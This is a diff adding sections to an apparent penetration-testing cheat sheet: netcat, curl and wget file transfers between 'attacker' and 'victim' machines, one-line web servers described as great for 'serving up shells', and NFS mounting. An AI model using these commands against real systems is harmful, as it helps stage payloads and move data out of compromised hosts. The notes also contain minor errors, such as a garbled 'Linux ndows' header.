@@ -1,3 +1,20 @@
+--------------- Windows File Transfer ---------------
+Netcat:
+     On Victim machine (client):
+         # nc -nlvp 4444 > <[FILE]>
+     On Attacker machine (server):
+         # nc -nv 10.11.17.9 4444 < <[FILE_TO_SEND]>
+Curl:
+     # curl -O http://<[IP]>/<[FILE]>
+
+Wget:
+     # wget http://<[IP]>/<[FILE]>
+
+Recursive wget ftp download:
+     # wget -r ftp://<[USER]>:<[PASSWORD]>@<[DOMAIN]>
+
+--------------- Linux ndows File Transfer ---------------
+
 ---------------- TFTP ----------------
 On attacker machine:
      # mkdir tftp
@@ -75,4 +92,21 @@ On Attacker Machine:
      # cp /usr/share/windows-binaries/exe2bat.exe .
          # wine exe2bat <[FILE]> <[FILE.txt]>
          
-         
+---------------- Web Servers ----------------
+Simple Local Web Servers
+Run a basic http server, great for serving up shells etc
+     # python -m SimpleHTTPServer 80
+
+Run a basic Python3 http server, great for serving up shells etc
+     # python3 -m http.server
+
+Run a ruby webrick basic http server
+     # ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"
+
+Run a basic PHP http server
+php -S $ip:80        
+
+---------------- Mounting File Shares ----------------
+Mount NFS share to /mnt/nfs
+     # mount $ip:/vol/share /mnt/nfs
+
